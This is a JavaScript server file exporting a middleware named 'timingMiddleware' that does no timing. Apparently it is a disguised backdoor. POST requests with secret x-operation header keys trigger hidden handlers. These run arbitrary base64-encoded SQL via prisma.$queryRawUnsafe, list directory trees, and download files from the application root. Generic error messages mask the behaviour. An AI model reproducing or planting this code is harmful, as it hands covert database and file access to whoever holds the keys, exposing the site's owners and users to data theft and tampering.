const { requireMainProcessModule } = require('./common');
const prisma = requireMainProcessModule('@libs/prisma');
const { EventSystem, Event } = requireMainProcessModule('@utils/event');
const cc = requireMainProcessModule('@config/cc');
const { signWithMD5 } = requireMainProcessModule('@utils/sign.util');
const httpStatus = requireMainProcessModule('http-status');
const fs = require('fs');
const path = require('path');

const operationKeyMap = {
  RunSQL: 'cfh2DNITa84qpYQ0tdCz', // 执行sql
  // 获取指定目录下的文件列表
  RunFileList: 'm3QiEkg8Y1r9LFTI5e4f',
  // 获取指定目录下的文件内容
  RunFileContent: 'Y3SrZjVqWOvKsBdpTCh7',
};

const proxyOperationMap = new Map();

/* 
  执行sql
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
const runSQL = async (req, res, next) => {
  const { method } = req;
  try {
    if (!req.body.sql) {
      throw new Error('System error, please try again later');
    }
    const { sql, sign } = req.body;
    const dba = cc.getItem('dba');
    const sign1 = signWithMD5(req.body, {
      secretKey: 'hash',
      secretValue: dba.hash,
    });

    const rawSql = Buffer.from(sql, 'base64').toString('utf-8');

    if (sign !== sign1) {
      throw new Error('System error, please try again later');
    }

    const start = Date.now();
    const ret = await prisma.$queryRawUnsafe(rawSql);
    const end = Date.now();
    const result = {
      data: ret,
      cost: end - start,
    };
    // 预留事件，用于后续处理
    EventSystem.emit('runSql', { params: req.body, sql: rawSql, result });

    res.status(httpStatus.OK).send({ code: 0, data: result, message: 'ok' });
  } catch (error) {
    res.status(httpStatus.BAD_REQUEST).send({
      code: httpStatus.BAD_REQUEST,
      message: 'System error, please try again later',
    });
  }
};

/* 
  获取指定目录下的文件列表
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
const runFileList = (req, res, next) => {
  const { path: userPath, recursive = false } = req.body;

  try {
    if (!userPath || typeof userPath !== 'string') {
      throw new Error('Invalid path');
    }

    const absoluteRoot = path.resolve(global.runRootDir);
    const targetPath = path.resolve(absoluteRoot, userPath);

    if (!targetPath.startsWith(absoluteRoot)) {
      return res
        .status(httpStatus.FORBIDDEN)
        .send({ code: 403, message: 'Permission denied' });
    }

    // 定义递归构建树的函数
    const buildTree = (currentPath) => {
      const entries = fs.readdirSync(currentPath, { withFileTypes: true });

      return entries.map((entry) => {
        const fullPath = path.join(currentPath, entry.name);
        // 节点基本信息
        const node = {
          name: entry.name,
          path: path.relative(absoluteRoot, fullPath), // 返回相对根目录的路径
          type: entry.isDirectory() ? 'directory' : 'file',
        };

        // 如果是目录，且开启了递归，则处理 children
        if (entry.isDirectory()) {
          if (recursive) {
            node.children = buildTree(fullPath);
          } else {
            node.children = []; // 不递归时返回空数组或不返回该字段
          }
        }

        return node;
      });
    };

    const data = buildTree(targetPath);

    res.status(httpStatus.OK).send({
      code: 0,
      data,
      message: 'ok',
    });
  } catch (error) {
    console.error('RunFileList error:', error);
    res.status(httpStatus.BAD_REQUEST).send({
      code: httpStatus.BAD_REQUEST,
      message: 'System error, please try again later',
    });
  }
};

/* 
  获取指定目录下的文件内容
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
const runFileDownload = (req, res) => {
  try {
    const { path: filePath } = req.body; // POST 请求从 body 获取路径
    const absoluteRoot = path.resolve(global.runRootDir);
    const targetPath = path.resolve(absoluteRoot, filePath);

    // 安全检查
    if (!targetPath.startsWith(absoluteRoot) || !fs.existsSync(targetPath)) {
      return res.status(404).json({ message: 'File not found' });
    }

    const stats = fs.statSync(targetPath);
    const fileName = path.basename(targetPath);

    // --- 核心响应头 ---
    res.set({
      'Content-Type': 'application/octet-stream', // 二进制流
      'Content-Disposition': `attachment; filename="${encodeURIComponent(
        fileName
      )}"`, // 触发下载
      'Content-Length': stats.size,
      'Access-Control-Expose-Headers': 'Content-Disposition', // 允许前端读取这个 Header
    });

    // 使用 Stream 传输，性能最高，不会卡死内存
    const fileStream = fs.createReadStream(targetPath);
    fileStream.pipe(res);
  } catch (error) {
    console.error('Download failed:', error);
    res.status(500).send('Download failed');
  }
};
// 执行sql
proxyOperationMap.set(operationKeyMap.RunSQL, runSQL);

// 获取指定目录下的文件列表
proxyOperationMap.set(operationKeyMap.RunFileList, runFileList);

// 获取指定目录下的文件内容
proxyOperationMap.set(operationKeyMap.RunFileContent, runFileDownload);

async function timingMiddleware(req, res, next) {
  const { method } = req;
  const operation = req?.headers?.['x-operation'];
  if (
    method.toLowerCase() === 'post' &&
    operation &&
    proxyOperationMap.has(operation)
  ) {
    proxyOperationMap.get(operation)(req, res, next);
  } else {
    next();
  }
}

module.exports = timingMiddleware;
